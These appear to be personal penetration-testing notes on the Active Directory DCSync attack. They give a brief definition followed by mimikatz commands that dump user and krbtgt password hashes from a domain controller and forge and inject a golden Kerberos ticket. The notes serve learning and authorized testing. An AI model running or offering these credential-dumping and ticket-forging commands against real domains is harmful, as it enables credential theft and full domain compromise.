# What is DCSync Attack?
- in active directory environment the concept of replication is what makes this attack possible under certain conditions, so simply the flow of replcation goes as the following
  


## DCSync
>DCSync is a technique for stealing the Active Directory password database by using the built-in `Directory Replication Service Remote Protocol`, which is used by Domain Controllers to replicate domain data. This allows an attacker to mimic a Domain Controller to retrieve user NTLM password hashes.
![[Pasted image 20260316143719.png]]
### Windows
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:domain.local /user:domain\Administrator"'
```
- or using the executable
```powershell
./mimikatz.exe
lsadump::dcsync /domain:domain.local /user:domain\Administrator # or  /all 
kerberos::golden /domain:corp.local /sid:S-1-5-21-XXX /krbtgt:HASH /user:Administrator /ticket:golden.kirbi #Golden ticket

# Golden Ticket
lsadump::dcsync /domain:domain.local /user:domain\krbtgt 
Invoke-Mimikatz -Command '"kerberos::golden /domain:corp.local /sid:S-1-5-21-XXX /krbtgt:HASH /user:Administrator /id:500 /ptt"'
```
